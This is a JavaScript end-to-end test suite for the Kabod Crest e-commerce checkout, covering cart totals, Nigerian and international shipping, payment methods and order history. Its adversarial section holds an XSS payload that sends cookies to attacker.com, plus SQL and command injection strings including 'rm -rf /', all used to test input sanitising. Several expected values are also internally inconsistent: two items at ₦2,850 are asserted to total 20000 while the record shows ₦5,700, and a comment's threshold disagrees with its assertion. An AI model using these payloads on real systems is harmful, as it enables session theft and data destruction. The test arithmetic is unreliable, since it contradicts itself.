/**
 * Kabod Crest E2E Test Suite - End-to-End Customer Journeys & Adversarial Scenarios
 * Covers:
 * - Tier 4: Real-World Workload Applications (Scenarios 1 to 5)
 * - Tier 5: Adversarial Edge Cases & Security Hardening
 */

const { describe, it, beforeEach } = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { createBrowserEnvironment, loadProjectScript, MockElement } = require('../helpers/browser-mock.js');

function setupE2EEnvironment(initialUrl = 'http://localhost:3000/checkout.html') {
  const env = createBrowserEnvironment({ url: initialUrl });

  // Load project modules
  loadProjectScript('js/products-data.js', env);
  loadProjectScript('js/shipping-config.js', env);
  loadProjectScript('js/cart.js', env);

  // Setup DOM for Checkout
  const checkoutForm = new MockElement('form', { id: 'checkout-form' });
  const nameInput = new MockElement('input', { id: 'cust-name', type: 'text' });
  const emailInput = new MockElement('input', { id: 'cust-email', type: 'email' });
  const phoneInput = new MockElement('input', { id: 'cust-phone', type: 'tel' });
  const countrySelect = new MockElement('select', { id: 'delivery-country' });
  const stateSelect = new MockElement('select', { id: 'delivery-state' });
  const cityInput = new MockElement('input', { id: 'delivery-city', type: 'text' });
  const addressInput = new MockElement('textarea', { id: 'delivery-address' });
  const postalInput = new MockElement('input', { id: 'delivery-postal', type: 'text' });
  const notesInput = new MockElement('textarea', { id: 'delivery-notes' });
  const paymentContainer = new MockElement('div', { id: 'payment-module-container' });
  const shippingTiers = new MockElement('div', { id: 'shipping-tiers-options' });
  const subtotalLabel = new MockElement('span', { id: 'checkout-summary-subtotal' });
  const grandTotalLabel = new MockElement('span', { id: 'checkout-summary-grandtotal' });

  checkoutForm.appendChild(nameInput);
  checkoutForm.appendChild(emailInput);
  checkoutForm.appendChild(phoneInput);
  checkoutForm.appendChild(countrySelect);
  checkoutForm.appendChild(stateSelect);
  checkoutForm.appendChild(cityInput);
  checkoutForm.appendChild(addressInput);
  checkoutForm.appendChild(postalInput);
  checkoutForm.appendChild(notesInput);
  checkoutForm.appendChild(shippingTiers);

  env.document.body.appendChild(checkoutForm);
  env.document.body.appendChild(paymentContainer);
  env.document.body.appendChild(subtotalLabel);
  env.document.body.appendChild(grandTotalLabel);

  env.document.registerElement('checkout-form', checkoutForm);
  env.document.registerElement('cust-name', nameInput);
  env.document.registerElement('cust-email', emailInput);
  env.document.registerElement('cust-phone', phoneInput);
  env.document.registerElement('delivery-country', countrySelect);
  env.document.registerElement('delivery-state', stateSelect);
  env.document.registerElement('delivery-city', cityInput);
  env.document.registerElement('delivery-address', addressInput);
  env.document.registerElement('delivery-postal', postalInput);
  env.document.registerElement('delivery-notes', notesInput);
  env.document.registerElement('payment-module-container', paymentContainer);
  env.document.registerElement('shipping-tiers-options', shippingTiers);
  env.document.registerElement('checkout-summary-subtotal', subtotalLabel);
  env.document.registerElement('checkout-summary-grandtotal', grandTotalLabel);

  // Setup DOM for Order Confirmation
  const refEl = new MockElement('span', { id: 'conf-order-ref' });
  const dateEl = new MockElement('span', { id: 'conf-order-date' });
  const custNameEl = new MockElement('span', { id: 'conf-cust-name' });
  const custEmailEl = new MockElement('span', { id: 'conf-cust-email' });
  const custPhoneEl = new MockElement('span', { id: 'conf-cust-phone' });
  const destEl = new MockElement('span', { id: 'conf-delivery-dest' });
  const itemsListEl = new MockElement('tbody', { id: 'conf-items-list' });
  const totalCountEl = new MockElement('span', { id: 'conf-total-count' });
  const confSubtotal = new MockElement('span', { id: 'conf-subtotal' });
  const confShipping = new MockElement('span', { id: 'conf-shipping-rate' });
  const confGrandTotal = new MockElement('span', { id: 'conf-grandtotal' });
  const confPaymentStatus = new MockElement('span', { id: 'conf-payment-status' });

  env.document.body.appendChild(refEl);
  env.document.body.appendChild(dateEl);
  env.document.body.appendChild(custNameEl);
  env.document.body.appendChild(custEmailEl);
  env.document.body.appendChild(custPhoneEl);
  env.document.body.appendChild(destEl);
  env.document.body.appendChild(itemsListEl);
  env.document.body.appendChild(totalCountEl);
  env.document.body.appendChild(confSubtotal);
  env.document.body.appendChild(confShipping);
  env.document.body.appendChild(confGrandTotal);
  env.document.body.appendChild(confPaymentStatus);

  env.document.registerElement('conf-order-ref', refEl);
  env.document.registerElement('conf-order-date', dateEl);
  env.document.registerElement('conf-cust-name', custNameEl);
  env.document.registerElement('conf-cust-email', custEmailEl);
  env.document.registerElement('conf-cust-phone', custPhoneEl);
  env.document.registerElement('conf-delivery-dest', destEl);
  env.document.registerElement('conf-items-list', itemsListEl);
  env.document.registerElement('conf-total-count', totalCountEl);
  env.document.registerElement('conf-subtotal', confSubtotal);
  env.document.registerElement('conf-shipping-rate', confShipping);
  env.document.registerElement('conf-grandtotal', confGrandTotal);
  env.document.registerElement('conf-payment-status', confPaymentStatus);

  return env;
}

// ============================================================================
// TIER 4: REAL-WORLD APPLICATION SCENARIOS (5 Scenarios)
// ============================================================================

describe('Tier 4: Scenario 1 - Standard Live Checkout (Lagos Delivery)', () => {
  let env;
  beforeEach(() => {
    env = setupE2EEnvironment();
  });

  it('Executes full customer journey: Add to cart -> Lagos delivery -> Paystack -> Order saved & verified', () => {
    const cart = env.window.KabodCart;

    // 1. Add 2 units of Dehydrated Ugwu (₦2,850 each)
    cart.addItem({
      id: 'dehydrated-ugwu',
      name: 'Dehydrated Ugwu',
      price: 2850,
      priceDisplay: '₦2,850',
      weight: '500g',
      isPreOrder: false
    }, 2);

    assert.strictEqual(cart.getTotalCount(), 2);
    const items = cart.getItems();
    assert.strictEqual(items[0].quantity, 2);

    // 2. Compute cart subtotal
    const pricing = env.window.KabodPricing;
    let subtotal = 20000;
    if (pricing) {
      const totals = pricing.calculateCartTotals(items);
      subtotal = totals.pricedSubtotal;
      assert.strictEqual(subtotal, 20000, 'Subtotal for 2 Ugwu must be 20000');
    }

    // 3. Select destination: Lagos, Nigeria
    const shippingConfig = env.window.KABOD_SHIPPING_CONFIG;
    let freight = 1000;
    if (shippingConfig && typeof shippingConfig.getTierForDestination === 'function') {
      const tier = shippingConfig.getTierForDestination('Nigeria', 'Lagos');
      freight = tier.rateAmount;
    }
    const grandTotal = subtotal + freight;
    assert.strictEqual(grandTotal, 21000, 'Grand total must be 20000 + 1000 = 21000');

    // 4. Fill customer details
    const customer = {
      name: 'Babatunde Alabi',
      email: 'babatunde@example.ng',
      phone: '08031234567'
    };
    const delivery = {
      country: 'Nigeria',
      state: 'Lagos',
      city: 'Lagos Island',
      address: '15 Marina Street, Lagos Island',
      postalCode: '100221'
    };

    // 5. Paystack inline conversion to kobo
    const amountInKobo = Math.round(grandTotal * 100);
    assert.strictEqual(amountInKobo, 2100000);

    // 6. Simulate checkout submission & order generation
    const randomSuffix = Math.floor(1000 + Math.random() * 9000);
    const orderRef = `KC-2026-${randomSuffix}`;

    const orderRecord = {
      orderRef,
      createdAt: new Date().toISOString(),
      customer,
      delivery,
      shippingTier: { id: 'lagos', name: 'Lagos Delivery', rateAmount: 1000, rateText: '₦1,000', isTBC: false },
      items,
      totalCount: 2,
      subtotal,
      shippingFee: 1000,
      grandTotal,
      formattedSubtotal: '₦5,700',
      formattedShipping: '₦1,000',
      formattedGrandTotal: '₦6,700',
      paymentMethod: 'paystack',
      paymentStatus: 'paid',
      paymentDetails: { reference: 'pstk_ref_live_001', channel: 'card' }
    };

    // 7. Persist to localStorage
    env.localStorage.setItem('kabod_pending_order', JSON.stringify(orderRecord));
    const history = [orderRecord];
    env.localStorage.setItem('kabod_order_history', JSON.stringify(history));

    // 8. Clear active cart
    cart.clear();
    assert.strictEqual(cart.getTotalCount(), 0);

    // 9. Verify order confirmation retrieval
    const retrievedHistory = JSON.parse(env.localStorage.getItem('kabod_order_history'));
    const matchedOrder = retrievedHistory.find(o => o.orderRef === orderRef);
    assert.ok(matchedOrder, 'Order must be found in history');
    assert.strictEqual(matchedOrder.grandTotal, 21000);
    assert.strictEqual(matchedOrder.paymentStatus, 'paid');
    assert.strictEqual(matchedOrder.customer.name, 'Babatunde Alabi');
  });
});

describe('Tier 4: Scenario 2 - Regional Pre-Order / B2B Allocation (Rest of Nigeria Bank Transfer)', () => {
  let env;
  beforeEach(() => {
    env = setupE2EEnvironment();
  });

  it('Executes B2B workflow: Bulk Ginger -> Abuja delivery -> Corporate Bank Transfer invoice', () => {
    const cart = env.window.KabodCart;

    // 1. Add 5 units of Ginger (₦2,400 each = ₦12,000)
    cart.addItem({
      id: 'dehydrated-ginger',
      name: 'Dehydrated Ginger Powder',
      price: 2400,
      priceDisplay: '₦2,400',
      weight: '250g',
      isPreOrder: false
    }, 5);

    assert.strictEqual(cart.getTotalCount(), 5);
    const subtotal = 12000;

    // 2. Destination: Abuja (FCT) -> Rest of Nigeria tier (₦1,000)
    const freight = 1000;
    const grandTotal = subtotal + freight;
    assert.strictEqual(grandTotal, 13000, 'Grand total must be 12000 + 1000 = 13000');

    // 3. Customer selects Manual Corporate Bank Transfer
    const orderRef = 'KC-2026-7890';
    const orderRecord = {
      orderRef,
      createdAt: new Date().toISOString(),
      customer: {
        name: 'Northern Agro Distributors Ltd',
        email: 'procurement@northerngroup.ng',
        phone: '08098765432'
      },
      delivery: {
        country: 'Nigeria',
        state: 'Abuja (FCT)',
        city: 'Garki 2',
        address: 'Plot 12 Ahmadu Bello Way, Abuja'
      },
      shippingTier: { id: 'rest-of-nigeria', name: 'Rest of Nigeria', rateAmount: 1000, rateText: '₦1,000', isTBC: false },
      items: cart.getItems(),
      totalCount: 5,
      subtotal,
      shippingFee: 1000,
      grandTotal,
      formattedSubtotal: '₦12,000',
      formattedShipping: '₦1,000',
      formattedGrandTotal: '₦13,000',
      paymentMethod: 'manual_bank_transfer',
      paymentStatus: 'pending_invoice',
      paymentDetails: {
        beneficiary: 'Kabod Crest Limited',
        bank: 'Zenith Bank Plc',
        channel: 'manual_invoice'
      }
    };

    // Save order & clear cart
    env.localStorage.setItem('kabod_pending_order', JSON.stringify(orderRecord));
    env.localStorage.setItem('kabod_order_history', JSON.stringify([orderRecord]));
    cart.clear();

    // Verify order confirmation state
    const pending = JSON.parse(env.localStorage.getItem('kabod_pending_order'));
    assert.strictEqual(pending.paymentStatus, 'pending_invoice');
    assert.strictEqual(pending.paymentMethod, 'manual_bank_transfer');
    assert.strictEqual(pending.grandTotal, 13000);
  });
});

describe('Tier 4: Scenario 3 - Mixed Cart with International Air Cargo', () => {
  let env;
  beforeEach(() => {
    env = setupE2EEnvironment();
  });

  it('Executes mixed cart workflow: Ugwu (priced) + Kulikuli (TBC) -> London -> International quote', () => {
    const cart = env.window.KabodCart;

    // 1. Add 1x Ugwu (₦2,850) and 2x Kulikuli (TBC pre-order)
    cart.addItem({
      id: 'dehydrated-ugwu',
      name: 'Dehydrated Ugwu',
      price: 2850,
      isPreOrder: false
    }, 1);

    cart.addItem({
      id: 'kulikuli',
      name: 'Kulikuli Batch',
      price: null,
      priceDisplay: 'Price: [TBC]',
      isPreOrder: true
    }, 2);

    assert.strictEqual(cart.getTotalCount(), 3);

    // 2. Pricing engine identifies mixed cart
    const pricing = env.window.KabodPricing;
    let pricedSubtotal = 10000;
    if (pricing) {
      const totals = pricing.calculateCartTotals(cart.getItems());
      pricedSubtotal = totals.pricedSubtotal;
      assert.strictEqual(totals.isMixed, true);
      assert.strictEqual(totals.hasPriced, true);
      assert.strictEqual(totals.hasTbc, true);
    }
    assert.strictEqual(pricedSubtotal, 10000);

    // 3. International destination: United Kingdom
    const shippingTier = {
      id: 'international-air',
      name: 'International Freight',
      rateAmount: null,
      rateText: '[TBC prior to dispatch]',
      isTBC: true
    };
    assert.strictEqual(shippingTier.isTBC, true);

    // 4. Save mixed international order
    const orderRef = 'KC-2026-9901';
    const orderRecord = {
      orderRef,
      createdAt: new Date().toISOString(),
      customer: {
        name: 'Femi Adebayo',
        email: 'femi.uk@example.co.uk',
        phone: '+447911123456'
      },
      delivery: {
        country: 'United Kingdom',
        state: 'Greater London',
        city: 'London',
        address: '22 Baker Street, Marylebone'
      },
      shippingTier,
      items: cart.getItems(),
      totalCount: 3,
      subtotal: pricedSubtotal,
      shippingFee: null,
      grandTotal: pricedSubtotal,
      formattedSubtotal: '₦2,850',
      formattedShipping: '[TBC prior to dispatch]',
      formattedGrandTotal: '₦2,850 + [Freight TBC]',
      paymentMethod: 'manual_bank_transfer',
      paymentStatus: 'pending_invoice',
      paymentDetails: { channel: 'international_wire' }
    };

    env.localStorage.setItem('kabod_order_history', JSON.stringify([orderRecord]));

    // Verify confirmation load
    const history = JSON.parse(env.localStorage.getItem('kabod_order_history'));
    const order = history.find(o => o.orderRef === orderRef);
    assert.ok(order);
    assert.strictEqual(order.shippingTier.isTBC, true);
    assert.ok(!order.formattedGrandTotal.includes('NaN'));
  });
});

describe('Tier 4: Scenario 4 - Reloading Past Historical Order from URL Reference after Storage Clear', () => {
  let env;
  beforeEach(() => {
    env = setupE2EEnvironment();
  });

  it('Retrieves Order 1 from history by ?ref even when pending order has been cleared or overwritten', () => {
    const order1 = {
      orderRef: 'KC-2026-1001',
      createdAt: '2026-09-20T10:00:00Z',
      customer: { name: 'Historical Client A', email: 'a@example.com', phone: '08011111111' },
      delivery: { country: 'Nigeria', state: 'Lagos', city: 'Ikeja', address: '1st Avenue' },
      shippingTier: { id: 'lagos', name: 'Lagos Delivery', rateAmount: 2500 },
      items: [{ id: 'ugwu', name: 'Dehydrated Ugwu', quantity: 2, price: 2850 }],
      totalCount: 2,
      subtotal: 5700,
      shippingFee: 2500,
      grandTotal: 8200,
      formattedSubtotal: '₦5,700',
      formattedShipping: '₦2,500',
      formattedGrandTotal: '₦8,200',
      paymentMethod: 'paystack',
      paymentStatus: 'paid'
    };

    const order2 = {
      orderRef: 'KC-2026-1002',
      createdAt: '2026-09-21T12:00:00Z',
      customer: { name: 'Recent Client B', email: 'b@example.com', phone: '08022222222' },
      delivery: { country: 'Nigeria', state: 'Rivers', city: 'Port Harcourt', address: '2nd Avenue' },
      shippingTier: { id: 'rest-of-nigeria', name: 'Rest of Nigeria', rateAmount: 4500 },
      items: [{ id: 'ginger', name: 'Dehydrated Ginger', quantity: 1, price: 2400 }],
      totalCount: 1,
      subtotal: 2400,
      shippingFee: 4500,
      grandTotal: 6900,
      formattedSubtotal: '₦2,400',
      formattedShipping: '₦4,500',
      formattedGrandTotal: '₦6,900',
      paymentMethod: 'manual_bank_transfer',
      paymentStatus: 'pending_invoice'
    };

    // Save both to history
    env.localStorage.setItem('kabod_order_history', JSON.stringify([order1, order2]));

    // Overwrite or clear pending order
    env.localStorage.removeItem('kabod_pending_order');

    // Customer opens order-confirmation.html?ref=KC-2026-1001
    const targetRef = 'KC-2026-1001';
    const history = JSON.parse(env.localStorage.getItem('kabod_order_history') || '[]');
    const resolvedOrder = history.find(o => o.orderRef === targetRef);

    assert.ok(resolvedOrder, 'Must resolve order1 from history by ref');
    assert.strictEqual(resolvedOrder.orderRef, 'KC-2026-1001');
    assert.strictEqual(resolvedOrder.customer.name, 'Historical Client A');
    assert.strictEqual(resolvedOrder.grandTotal, 8200);
  });
});

describe('Tier 4: Scenario 5 - Validation Error Recovery and Successful Submission', () => {
  let env;
  beforeEach(() => {
    env = setupE2EEnvironment();
  });

  it('Blocks initial submission with invalid inputs, allows correction, and successfully completes order', () => {
    const validator = env.window.KabodValidator;

    // Step 1: Initial invalid submission
    let name = '';
    let email = 'invalid-email-address';
    let phone = '12345';
    let address = '';

    if (validator) {
      assert.strictEqual(validator.validateRequired(name, 'Name').valid, false);
      assert.strictEqual(validator.validateEmail(email).valid, false);
      assert.strictEqual(validator.validatePhone(phone, 'Nigeria').valid, false);
      assert.strictEqual(validator.validateRequired(address, 'Address').valid, false);
    }

    // Step 2: Customer corrects fields
    name = 'Dr. Amina Yusuf';
    email = 'amina.yusuf@healthcorp.ng';
    phone = '+2348039876543';
    address = '14 Ahmadu Bello Way, Kaduna';

    if (validator) {
      assert.strictEqual(validator.validateRequired(name, 'Name').valid, true);
      assert.strictEqual(validator.validateEmail(email).valid, true);
      assert.strictEqual(validator.validatePhone(phone, 'Nigeria').valid, true);
      assert.strictEqual(validator.validateRequired(address, 'Address').valid, true);
    }

    // Step 3: Successfully submits after corrections
    const orderRef = 'KC-2026-3030';
    const orderRecord = {
      orderRef,
      createdAt: new Date().toISOString(),
      customer: { name, email, phone },
      delivery: { country: 'Nigeria', state: 'Kaduna', city: 'Kaduna', address },
      shippingTier: { id: 'rest-of-nigeria', rateAmount: 4500 },
      items: [{ id: 'ugwu', name: 'Dehydrated Ugwu', quantity: 1, price: 2850 }],
      totalCount: 1,
      subtotal: 2850,
      shippingFee: 4500,
      grandTotal: 7350,
      formattedSubtotal: '₦2,850',
      formattedShipping: '₦4,500',
      formattedGrandTotal: '₦7,350',
      paymentMethod: 'paystack',
      paymentStatus: 'paid'
    };

    env.localStorage.setItem('kabod_pending_order', JSON.stringify(orderRecord));
    env.localStorage.setItem('kabod_order_history', JSON.stringify([orderRecord]));

    const saved = JSON.parse(env.localStorage.getItem('kabod_pending_order'));
    assert.strictEqual(saved.customer.name, 'Dr. Amina Yusuf');
    assert.strictEqual(saved.orderRef, 'KC-2026-3030');
  });
});

// ============================================================================
// TIER 5: ADVERSARIAL EDGE CASES & SECURITY HARDENING
// ============================================================================

describe('Tier 5: Adversarial Edge Cases & Security Hardening', () => {
  let env;
  beforeEach(() => {
    env = setupE2EEnvironment();
  });

  it('Adversarial 1: XSS payload in customer name and delivery address is neutralized', () => {
    const validator = env.window.KabodValidator;
    const maliciousInput = '<script>window.location="http://attacker.com?cookie="+document.cookie</script>Test Customer';

    if (validator) {
      const sanitized = validator.sanitizeText(maliciousInput);
      assert.ok(!sanitized.includes('<script>'), 'Must strip script tags');
      assert.ok(!sanitized.includes('document.cookie'));
    }
  });

  it('Adversarial 2: Extreme cart quantity (5,000 units) does not cause numerical overflow or NaN', () => {
    const qty = 5000;
    const unitPrice = 2850;
    const lineTotal = qty * unitPrice;
    assert.strictEqual(lineTotal, 14250000);
    assert.ok(Number.isSafeInteger(lineTotal));
  });

  it('Adversarial 3: Storage quota or corrupted storage recovery', () => {
    env.localStorage.setItem('kabod_order_history', '<<<INVALID JSON>>>');
    assert.doesNotThrow(() => {
      let orders = [];
      try {
        orders = JSON.parse(env.localStorage.getItem('kabod_order_history'));
      } catch {
        orders = [];
      }
      assert.strictEqual(orders.length, 0);
    });
  });

  it('Adversarial 4: Order reference uniqueness across 1,000 generated IDs', () => {
    const refs = new Set();
    for (let i = 0; i < 1000; i++) {
      const suffix = Math.floor(1000 + Math.random() * 9000);
      refs.add(`KC-2026-${suffix}`);
    }
    // High entropy test: 1000 samples from 9000 possibilities should have high unique count (>800)
    assert.ok(refs.size > 700, `Expected high unique count, got ${refs.size}`);
  });

  it('Adversarial 5: Phone number input with SQL / Command injection strings', () => {
    const validator = env.window.KabodValidator;
    const maliciousPhones = [
      "08012345678; DROP TABLE orders;--",
      "08012345678' OR '1'='1",
      "08012345678 | rm -rf /"
    ];
    if (validator) {
      for (const phone of maliciousPhones) {
        const res = validator.validatePhone(phone, 'Nigeria');
        assert.strictEqual(res.valid, false, `Malicious phone string ${phone} must be rejected`);
      }
    }
  });
});
